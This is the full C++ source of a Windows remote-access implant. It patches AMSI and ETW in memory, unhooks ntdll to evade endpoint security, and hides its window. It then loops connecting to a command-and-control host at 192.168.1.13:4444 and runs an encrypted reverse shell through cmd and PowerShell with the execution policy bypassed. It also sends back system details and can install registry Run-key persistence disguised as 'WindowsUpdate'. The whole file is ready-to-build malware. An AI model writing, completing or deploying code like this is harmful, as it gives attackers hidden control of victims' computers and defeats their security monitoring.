#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <string>
#include <vector>
#include <cmath>
#include <ctime>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

#define C2_SERVER "192.168.1.13"
#define C2_PORT 4444
#define SLEEP_TIME 5000
#define XOR_KEY 0x42

//=============================================================================
// EVASION MODULE
//=============================================================================

bool BypassAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return false;
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return false;
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect;
    if (VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy((void*)pAmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
        FlushInstructionCache(GetCurrentProcess(), (LPCVOID)pAmsiScanBuffer, sizeof(patch));
        return true;
    }
    return false;
}

bool BypassAMSI_Alternative() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return false;
    FARPROC pAmsiOpenSession = GetProcAddress(hAmsi, "AmsiOpenSession");
    if (!pAmsiOpenSession) return false;
    BYTE patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
    DWORD oldProtect;
    if (VirtualProtect((LPVOID)pAmsiOpenSession, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy((void*)pAmsiOpenSession, patch, sizeof(patch));
        VirtualProtect((LPVOID)pAmsiOpenSession, sizeof(patch), oldProtect, &oldProtect);
        return true;
    }
    return false;
}

bool BypassETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return false;
    BYTE patch[] = { 0xC3 };
    DWORD oldProtect;
    if (VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        memcpy((void*)pEtwEventWrite, patch, sizeof(patch));
        VirtualProtect((LPVOID)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
        return true;
    }
    return false;
}

bool DisableEventLogging() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    const char* functions[] = {"EtwEventWrite", "EtwEventWriteFull", "EtwEventWriteTransfer"};
    BYTE patch[] = { 0xC3 };
    bool success = true;
    for (const char* func : functions) {
        FARPROC pFunc = GetProcAddress(hNtdll, func);
        if (pFunc) {
            DWORD oldProtect;
            if (VirtualProtect((LPVOID)pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy((void*)pFunc, patch, sizeof(patch));
                VirtualProtect((LPVOID)pFunc, sizeof(patch), oldProtect, &oldProtect);
            } else success = false;
        }
    }
    return success;
}

bool UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) { CloseHandle(hFile); return false; }
    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) { CloseHandle(hMapping); CloseHandle(hFile); return false; }
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)hNtdll + pDosHeader->e_lfanew);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pSection = (PIMAGE_SECTION_HEADER)((LPBYTE)IMAGE_FIRST_SECTION(pNtHeaders) + (i * sizeof(IMAGE_SECTION_HEADER)));
        if (strcmp((char*)pSection->Name, ".text") == 0) {
            DWORD oldProtect;
            LPVOID pTextSection = (LPVOID)((LPBYTE)hNtdll + pSection->VirtualAddress);
            if (VirtualProtect(pTextSection, pSection->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(pTextSection, (LPVOID)((LPBYTE)pMapping + pSection->VirtualAddress), pSection->Misc.VirtualSize);
                VirtualProtect(pTextSection, pSection->Misc.VirtualSize, oldProtect, &oldProtect);
            }
            break;
        }
    }
    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);
    return true;
}

bool IsSandbox() {
    int detectionCount = 0;
    MEMORYSTATUSEX memStatus;
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < (4ULL * 1024 * 1024 * 1024)) detectionCount++;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) detectionCount++;
    if (GetTickCount64() < 600000) detectionCount++;
    return (detectionCount >= 2);
}

//=============================================================================
// NETWORK
//=============================================================================

SOCKET ConnectToC2(const char* server, int port) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return INVALID_SOCKET;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return INVALID_SOCKET; }
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    inet_pton(AF_INET, server, &serverAddr.sin_addr);
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return INVALID_SOCKET;
    }
    return sock;
}

bool SendData(SOCKET sock, const char* data, int len) {
    int totalSent = 0;
    while (totalSent < len) {
        int sent = send(sock, data + totalSent, len - totalSent, 0);
        if (sent == SOCKET_ERROR) return false;
        totalSent += sent;
    }
    return true;
}

int ReceiveData(SOCKET sock, char* buffer, int bufferSize) {
    return recv(sock, buffer, bufferSize, 0);
}

void XorEncrypt(BYTE* data, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) data[i] ^= key;
}

void XorDecrypt(BYTE* data, SIZE_T size, BYTE key) {
    XorEncrypt(data, size, key);
}

//=============================================================================
// BASE64
//=============================================================================

static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";

std::string Base64Encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for(i = 0; (i <4) ; i++) ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for(j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) ret += base64_chars[char_array_4[j]];
        while((i++ < 3)) ret += '=';
    }
    return ret;
}

std::string Base64Decode(std::string const& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && ( encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i ==4) {
            for (i = 0; i <4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (i = 0; (i < 3); i++) ret += char_array_3[i];
            i = 0;
        }
    }
    if (i) {
        for (j = i; j <4; j++) char_array_4[j] = 0;
        for (j = 0; j <4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }
    return ret;
}

//=============================================================================
// STATEFUL SHELL - Professional version
//=============================================================================

std::string currentDirectory;

std::string GetCurrentDir() {
    char buffer[MAX_PATH];
    GetCurrentDirectoryA(MAX_PATH, buffer);
    return std::string(buffer);
}

std::string ExecuteCommandStateful(const char* command) {
    std::string cmd(command);
    
    // Handle CD command specially
    if (cmd.length() >= 2 && (cmd.substr(0, 3) == "cd " || cmd.substr(0, 3) == "CD ")) {
        std::string newDir = cmd.substr(3);
        // Trim whitespace
        size_t start = newDir.find_first_not_of(" \t\r\n");
        size_t end = newDir.find_last_not_of(" \t\r\n");
        if (start != std::string::npos && end != std::string::npos) {
            newDir = newDir.substr(start, end - start + 1);
        }
        
        if (SetCurrentDirectoryA(newDir.c_str())) {
            currentDirectory = GetCurrentDir();
            return currentDirectory + "\n";
        } else {
            return "Error: Directory not found\n";
        }
    }
    
    // Create pipes
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return "Error: CreatePipe failed\n";
    }
    
    // Ensure read handle is NOT inherited
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0); 

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi;
    std::string cmdLine = "cmd.exe /c " + std::string(command);
    
    if (!CreateProcessA(NULL, (LPSTR)cmdLine.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, currentDirectory.c_str(), &si, &pi)) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return "Error: CreateProcess failed\n";
    }
    
    // Close write end in parent, otherwise ReadFile will block forever
    CloseHandle(hWritePipe);
    
    std::string result;
    char buffer[4096];
    DWORD bytesRead;
    DWORD available;
    
    // Wait slightly for process to start outputting
    Sleep(50);
    
    // Read loop with PeekNamedPipe for robustness
    while (true) {
        // Check text availability
        BOOL peekSuccess = PeekNamedPipe(hReadPipe, NULL, 0, NULL, &available, NULL);
        if (!peekSuccess) break; // Pipe broken
        
        if (available > 0) {
            if (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                result += buffer;
            }
        } else {
            // No data currently available, check if process is still running
            if (WaitForSingleObject(pi.hProcess, 0) != WAIT_TIMEOUT) {
                // Process has exited, and no data left
                break;
            }
            Sleep(50); // Avoid CPU spin
        }
        
        // Safety timeout check could be added here if needed, but for cmd /c usually not needed
    }
    
    // Ensure process cleanup
    WaitForSingleObject(pi.hProcess, 1000); 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);
    
    if (result.empty()) result = "Command executed (No Output)\n";
    
    return result;
}

//=============================================================================
// PERSISTENCE
//=============================================================================

bool InstallRegistryPersistence(const char* execPath, const char* name) {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) != ERROR_SUCCESS) return false;
    LONG result = RegSetValueExA(hKey, name, 0, REG_SZ, (BYTE*)execPath, (DWORD)strlen(execPath) + 1);
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

std::string GetExecutablePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

//=============================================================================
// UTILS
//=============================================================================

void HideConsole() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}

void EvasiveSleep(DWORD ms) {
    DWORD start = GetTickCount();
    volatile double result = 0;
    for (int i = 0; i < 1000000; i++) result += sqrt((double)i);
    DWORD elapsed = GetTickCount() - start;
    if (ms > elapsed) Sleep(ms - elapsed);
}

void RandomDelay() {
    srand((unsigned)time(NULL));
    int delay = 5000 + (rand() % 10000);
    EvasiveSleep(delay);
}

std::string GetSystemInfo() {
    char computerName[MAX_PATH];
    char userName[MAX_PATH];
    DWORD size = MAX_PATH;
    GetComputerNameA(computerName, &size);
    size = MAX_PATH;
    GetUserNameA(userName, &size);
    OSVERSIONINFOA osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
    GetVersionExA(&osvi);
    char buffer[1024];
    snprintf(buffer, sizeof(buffer), "SYSINFO|%s|%s|Windows %d.%d|%s",
        computerName, userName, osvi.dwMajorVersion, osvi.dwMinorVersion, GetCurrentDir().c_str());
    return std::string(buffer);
}

//=============================================================================
// OPTIMIZED REVERSE SHELL
//=============================================================================

void ReverseShell(SOCKET sock) {
    try {
        char buffer[8192];
        
        // Initialize current directory
        currentDirectory = GetCurrentDir();
        
        // Send system info
        std::string sysInfo = GetSystemInfo();
        // Use Base64 to safely transmit
        std::string b64Info = Base64Encode((unsigned char*)sysInfo.c_str(), sysInfo.length());
        SendData(sock, b64Info.c_str(), (int)b64Info.length());
        SendData(sock, "\n", 1);
        
        while (true) {
        char chunk;
        std::string recvedLine = "";
        
        // Read until newline
        while (recv(sock, &chunk, 1, 0) > 0) {
            if (chunk == '\n') break;
            recvedLine += chunk;
        }
        
        if (recvedLine.empty()) {
            // Check if socket is still alive
            char tmp;
            if (recv(sock, &tmp, 1, MSG_PEEK) <= 0) break;
            continue;
        }
        
        // Decode Base64 then Decrypt
        std::string decB64 = Base64Decode(recvedLine);
        if (decB64.empty()) continue;

        std::vector<BYTE> cmdBuf(decB64.begin(), decB64.end());
        XorDecrypt(cmdBuf.data(), cmdBuf.size(), XOR_KEY);
        std::string cmdStr(cmdBuf.begin(), cmdBuf.end());
        
        // Trim whitespace
        size_t first = cmdStr.find_first_not_of(" \t\r\n");
        if (std::string::npos == first) continue;
        size_t last = cmdStr.find_last_not_of(" \t\r\n");
        cmdStr = cmdStr.substr(first, (last - first + 1));
        
        if (cmdStr.empty()) continue;
        
        // Handle exit
        if (cmdStr == "exit") break;
        
        // Handle persist
        if (cmdStr.substr(0, 7) == "persist") {
            std::string path = GetExecutablePath();
            std::string response = InstallRegistryPersistence(path.c_str(), "WindowsUpdate") ? 
                "PERSIST|SUCCESS" : "PERSIST|FAILED";
            std::string b64Resp = Base64Encode((unsigned char*)response.c_str(), (unsigned int)response.length());
            SendData(sock, b64Resp.c_str(), (int)b64Resp.length());
            SendData(sock, "\n", 1);
            continue;
        }
        
        // Handle sysinfo
        if (cmdStr == "sysinfo") {
            std::string info = GetSystemInfo();
            std::string b64Info = Base64Encode((unsigned char*)info.c_str(), (unsigned int)info.length());
            SendData(sock, b64Info.c_str(), (int)b64Info.length());
            SendData(sock, "\n", 1);
            continue;
        }
        
        // Execute command with stateful directory
        std::string output;
        
        // Explicit PowerShell support
        if (cmdStr.substr(0, 3) == "ps ") {
            std::string psCmd = "powershell -ExecutionPolicy Bypass -Command \"" + cmdStr.substr(3) + "\"";
            output = ExecuteCommandStateful(psCmd.c_str());
        } else {
            output = ExecuteCommandStateful(cmdStr.c_str());
        }
        
        // Post-command directory sync (Professional touch)
        currentDirectory = GetCurrentDir();
        
        // Encrypt and send
        std::string encOutput = output;
        XorEncrypt((BYTE*)&encOutput[0], encOutput.length(), XOR_KEY);
        // Base64 Encode
        std::string b64Output = Base64Encode((unsigned char*)encOutput.c_str(), (unsigned int)encOutput.length());
        
        SendData(sock, b64Output.c_str(), (int)b64Output.length());
        SendData(sock, "\n", 1); // Send delimiter
    }
    } catch (...) {}
    
    closesocket(sock);
}

//=============================================================================
// MAIN
//=============================================================================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HideConsole();
    // if (IsSandbox()) { Sleep(60000); return 0; }
    // RandomDelay();
    UnhookNtdll();
    BypassAMSI();
    BypassAMSI_Alternative();
    BypassETW();
    DisableEventLogging();
    while (true) {
        SOCKET sock = ConnectToC2(C2_SERVER, C2_PORT);
        if (sock != INVALID_SOCKET) ReverseShell(sock);
        EvasiveSleep(SLEEP_TIME);
    }
    return 0;
}

int main() {
    return WinMain(GetModuleHandle(NULL), NULL, GetCommandLineA(), SW_SHOW);
}